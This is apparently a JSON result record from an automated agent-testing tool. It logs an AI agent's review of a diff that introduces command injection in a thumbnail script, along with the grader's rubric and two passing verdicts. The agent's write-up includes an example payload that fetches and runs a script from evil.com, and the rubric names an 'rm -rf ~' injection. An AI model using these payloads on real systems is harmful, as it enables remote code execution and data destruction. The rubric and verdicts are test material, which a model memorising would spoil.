@@ -1,0 +1,71 @@
+{
+  "caseId": "obfuscated-cmdi",
+  "rep": 5,
+  "prompt": "Review this diff for security issues and report your findings.",
+  "files": [
+    "diff-obfuscated-cmdi.patch"
+  ],
+  "output": "## Summary\n\nThe diff introduces a **command injection vulnerability (CWE-78)** in `src/media/thumbnail.py`.\n\n**Critical: OS command injection via `os.system()`** (line 12-14)\nThe change replaces a safe `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` call — which uses argv-list form with no shell involved, so shell metacharacters in arguments are inert — with:\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`os.system()` invokes `/bin/sh -c` on the joined string. Both `infile` and `size` come straight from `request.GET` with no validation, escaping, or allow-listing. An attacker can supply something like:\n```\n?src=input.png;curl+http://evil.com/x.sh|sh&size=100x100\n```\nand the shell will interpret the `;`, `|`, backticks, `$()`, etc., resulting in arbitrary command execution with the web process's privileges — a full RCE, not just an image-processing bug.\n\n**Misleading fix: unused `shlex` import** (line 6)\n`shlex` is imported but never actually used (e.g. via `shlex.quote()`) to sanitize `infile`/`size` before joining. This makes the diff look like it added safe quoting when it did not — the injection is completely unmitigated.\n\n**Fix recommendation:** revert to the original `subprocess.run([...], check=True)` argv form (no shell), and if any shell invocation is ever required, wrap each user-supplied argument with `shlex.quote()`. Better still, validate `size` against a strict pattern like `^\\d+x\\d+$` and validate/sanitize `infile` against a path allow-list to also prevent path traversal.",
+  "exitCode": 0,
+  "timedOut": false,
+  "infraRetries": 0,
+  "startedAt": "2026-07-19T00:23:05.188Z",
+  "durationMs": 37050,
+  "checks": [
+    {
+      "matcher": "llm_rubric",
+      "passed": true,
+      "details": {
+        "verdict": "pass",
+        "judgments": [
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified that the diff introduces an OS command injection vulnerability, explaining that user-controlled `infile`/`size` from `request.GET` are joined into a shell string via `\" \".join(parts)` and passed to `os.system()`, which invokes `/bin/sh -c`, allowing arbitrary command execution — contrasting it with the prior safe `subprocess.run([...])` argv-list form. It also correctly noted the unused `shlex` import as misleading rather than mistaking it for a mitigation. This matches the rubric's PASS criteria precisely.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified that the diff introduces an OS command injection vulnerability, explaining that user-controlled `infile`/`size` from `request.GET` are joined into a shell string via `\" \".join(parts)` and passed to `os.system()`, which invokes `/bin/sh -c`, allowing arbitrary command execution — contrasting it with the prior safe `subprocess.run([...])` argv-list form. It also correctly noted the unused `shlex` import as misleading rather than mistaking it for a mitigation. This matches the rubric's PASS criteria precisely."
+          },
+          {
+            "verdict": "pass",
+            "reasoning": "The agent correctly identified the exact vulnerability described in the rubric: os.system() being invoked on a shell string built by joining user-controlled request.GET values (size, infile/src), explicitly noting this replaced a safe subprocess.run argv-list call, giving a concrete injection payload example, and correctly flagging the unused shlex import as misleading rather than mistaking it for a mitigation.",
+            "raw": "VERDICT: PASS\nREASON: The agent correctly identified the exact vulnerability described in the rubric: os.system() being invoked on a shell string built by joining user-controlled request.GET values (size, infile/src), explicitly noting this replaced a safe subprocess.run argv-list call, giving a concrete injection payload example, and correctly flagging the unused shlex import as misleading rather than mistaking it for a mitigation."
+          }
+        ],
+        "model": "claude-sonnet-5",
+        "transport": "claude-agent",
+        "prompt": "You are an impartial evaluator inside an automated agent-testing tool. Judge ONLY whether the agent's output satisfies the rubric — not style, not effort, not whether you would have answered differently.\n\n<rubric>\nThe diff introduces an OS command injection vulnerability: user-controlled `size`/`src` from request.GET are collected into a `parts` list that is then joined into a single shell string with `' '.join(parts)` and passed to `os.system(...)`, allowing arbitrary shell command execution (e.g. size='100x100; rm -rf ~'). The previous code used a safe `subprocess.run([...])` argument vector. PASS only if the review identifies this as a real command/shell injection vulnerability caused by user input reaching `os.system`; FAIL if it misses it, concludes the code is safe (e.g. mistakes `parts` for a safe argument vector), or only comments on style or the unused `shlex` import.\n</rubric>\n\n<task_given_to_agent>\nReview this diff for security issues and report your findings.\n</task_given_to_agent>\n\n<agent_output>\n## Summary\n\nThe diff introduces a **command injection vulnerability (CWE-78)** in `src/media/thumbnail.py`.\n\n**Critical: OS command injection via `os.system()`** (line 12-14)\nThe change replaces a safe `subprocess.run([\"convert\", infile, \"-resize\", size, outfile], check=True)` call — which uses argv-list form with no shell involved, so shell metacharacters in arguments are inert — with:\n```python\nparts = [\"convert\", infile, \"-resize\", size, outfile]\nos.system(\" \".join(parts))\n```\n`os.system()` invokes `/bin/sh -c` on the joined string. Both `infile` and `size` come straight from `request.GET` with no validation, escaping, or allow-listing. An attacker can supply something like:\n```\n?src=input.png;curl+http://evil.com/x.sh|sh&size=100x100\n```\nand the shell will interpret the `;`, `|`, backticks, `$()`, etc., resulting in arbitrary command execution with the web process's privileges — a full RCE, not just an image-processing bug.\n\n**Misleading fix: unused `shlex` import** (line 6)\n`shlex` is imported but never actually used (e.g. via `shlex.quote()`) to sanitize `infile`/`size` before joining. This makes the diff look like it added safe quoting when it did not — the injection is completely unmitigated.\n\n**Fix recommendation:** revert to the original `subprocess.run([...], check=True)` argv form (no shell), and if any shell invocation is ever required, wrap each user-supplied argument with `shlex.quote()`. Better still, validate `size` against a strict pattern like `^\\d+x\\d+$` and validate/sanitize `infile` against a path allow-list to also prevent path traversal.\n</agent_output>\n\nAnswer in EXACTLY this format (first line must be the verdict):\nVERDICT: PASS\nREASON: <one short paragraph>\n\nor\n\nVERDICT: FAIL\nREASON: <one short paragraph>"
+      }
+    }
+  ],
+  "usage": {
+    "input_tokens": 8,
+    "output_tokens": 1758,
+    "model": "claude-sonnet-5"
+  },
+  "transcript": {
+    "subtype": "success",
+    "num_turns": 4,
+    "total_cost_usd": 0.0970502,
+    "modelUsage": {
+      "claude-haiku-4-5-20251001": {
+        "inputTokens": 546,
+        "outputTokens": 13,
+        "cacheReadInputTokens": 0,
+        "cacheCreationInputTokens": 0,
+        "webSearchRequests": 0,
+        "costUSD": 0.000611,
+        "contextWindow": 200000,
+        "maxOutputTokens": 32000
+      },
+      "claude-sonnet-5": {
+        "inputTokens": 8,
+        "outputTokens": 1758,
+        "cacheReadInputTokens": 110584,
+        "cacheCreationInputTokens": 6145,
+        "webSearchRequests": 0,
+        "costUSD": 0.0964392,
+        "contextWindow": 1000000,
+        "maxOutputTokens": 64000
+      }
+    },
+    "_note": "SDK message stream removed for privacy; summary retained"
+  }
+}
